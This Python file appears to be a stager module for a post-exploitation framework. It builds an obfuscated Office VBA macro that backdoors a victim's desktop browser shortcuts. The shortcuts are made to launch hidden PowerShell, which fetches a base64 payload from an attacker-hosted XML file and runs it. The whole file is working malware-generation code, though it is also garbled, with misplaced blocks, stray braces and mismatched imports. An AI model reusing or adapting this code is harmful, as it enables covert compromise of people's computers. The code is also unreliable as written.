import string, random,
from lib.common import helpers_old

 
class stager:
def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorObfuscated',
            'Author': ['4po (@apo#0001)'],

        }


        self.mainMenu = mainMenu
        
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    @staticmethod
    def encoder(strIn):
	encStr = []
	randOffset = random.randint(2,7)
	junkChars = random.randint(2,30)
	print("%02x" % junkChars)
	encStr.append(str(randOffset))
	encStr.append("%02x" % junkChars)
	encStr.append(''.join(random.choice(string.digits[2:9]) for _ in range (junkChars)))
	for c in strIn:
		encStr.append(format(ord(c)-randOffset, "x"))
		encStr.append(str(random.randint(2,7)))
	return ''.join(encStr)



    def generate(self):

        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
	targetEXE = self.options['TargetEXEs']['Value']	
	XmlPath = self.options['XmlUrl']['Value']
	XmlOut = self.options['XmlOutFile']['Value']
	targetEXE = targetEXE.split(',')
	targetEXE = filter(None,targetEXE)

	fncDecryptName = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,15)))
	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	fsoVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	folderVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	fileVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	encStrVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	tempStrVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	shiftVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	offsetVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))
	blockVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(10,25)))

        # générer le lanceur
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
	launcher = launcher.split(" ")[-1]

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            macro = "Sub Auto_Close()\n"
	    #macro += "Dim " + shellVar + " As Object, " + lnkVar + " as Object, " + blockVar + " as String\n"
	    macro += "Set " + shellVar + " = CreateObject(" + fncDecryptName + "(\"" + self.encoder("Wscript.Shell") + "\"))\n"
	    macro += "Set " + fsoVar + " = CreateObject(" + fncDecryptName + "(\"" + self.encoder("Scripting.FileSystemObject") + "\"))\n"
	    macro += "Set " + folderVar + " = " + fsoVar + ".GetFolder(" + shellVar + ".SpecialFolders(\"desktop\"))\n"	
	    macro += "For Each " + fileVar + " In " + folderVar + ".Files\n"
	    macro += "If(InStr(Lcase(" + fileVar + "), \".lnk\")) Then\n"
	    macro += "Set " + lnkVar + " = " + shellVar + ".CreateShortcut(" + shellVar + ".SPecialFolders(\"desktop\") & \"\\\" & " + fileVar + ".name)\n"
	    macro += "If("
	    for i, item in enumerate(targetEXE):
		if i:
			macro += (' or ')
	    	macro += "InStr(Lcase(" + lnkVar + ".targetPath), " + fncDecryptName + "(\"" + self.encoder(targetEXE[i].strip().lower() + ".") + "\"))"
	    macro += ") Then\n"

	    
	    launchString1 = " -w hidden -nop -command \"[System.Diagnostics.Process]::Start(\'" 
	    launchString2 = "& " + lnkVar + ".targetPath & "
	    launchString3 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName); if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;$b.Load(\'"
	   
	    launchString4 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\""
	    launchString1 = helpers.randomize_capitalization(launchString1)
	    launchString2 = helpers.randomize_capitalization(launchString2)
	    launchString3 = helpers.randomize_capitalization(launchString3)
	    launchString4 = helpers.randomize_capitalization(launchString4)
	    

	    chunks = list(helpers.chunks(self.encoder(launchString3 + XmlPath + launchString4), random.randint(600,750)))
            macro += blockVar + " = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                macro += blockVar + " = " + blockVar + " + \"" + str(chunk) + "\"\n"

	    macro += lnkVar +".IconLocation = " + lnkVar + ".targetpath\n"
	    launchString = fncDecryptName + "(\"" + self.encoder(launchString1) + "\")" + launchString2 + fncDecryptName + "(" + blockVar + ")\n"
	    macro += lnkVar + ".arguments = " + launchString
	    macro += lnkVar + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) & "+ fncDecryptName +"(\""+self.encoder(":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") + "\")\n"
	    macro += lnkVar + ".save\n"
	    macro += "end if\n"
	    macro += "end if\n"
	    macro += "next " + fileVar + "\n"
            macro += "End Sub\n\n"

	    macro += "Function " + fncDecryptName + "(" + encStrVar + ") as String\n"
	    macro += "Dim " + tempStrVar + ", " + shiftVar + ", " + offsetVar + "\n"
	    macro += shiftVar + " = CLng(\"&H\" & Left(" + encStrVar + ", 1))\n"
	    macro += offsetVar + " = CLng(\"&H\" & Mid(" + encStrVar + ", 2, 2)) + 4\n"
	    macro += "For i = " + offsetVar +" To Len(" + encStrVar + ") Step 3\n"
	    macro += tempStrVar + " = " + tempStrVar + " & Chr(CLng(\"&H\" & Mid(" + encStrVar + ",i,2)) + " + shiftVar + ")\n"
	    macro += "Next\n"
	    macro += fncDecryptName + " = " + tempStrVar + "\n"
	    macro += "End Function"


	    print("Writing xml...\n")
	    f = open(XmlOut,"w")
	    f.write("<?xml version=\"1.0\"?>\n")
	    f.write("<command>\n")
	    f.write("\t<a>\n")
	    f.write("\t<execute>"+launcher+"</execute>\n")
	    f.write("\t</a>\n")
	    f.write("</command>\n")
	    print("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n")

            return macro

	        }
xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(4,8)))

        self.options = {
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the launcher to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
	    'TargetEXEs' : {
                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
                'Required'      :   True,
                'Value'         :   'iexplore,firefox,chrome'
            },
            'XmlUrl' : {
                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
                'Required'      :   True,
                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
	    'XmlOutFile' : {
                'Description'   :   'Local path + file to output xml to.',
                'Required'      :   True,
                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
 	    'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }

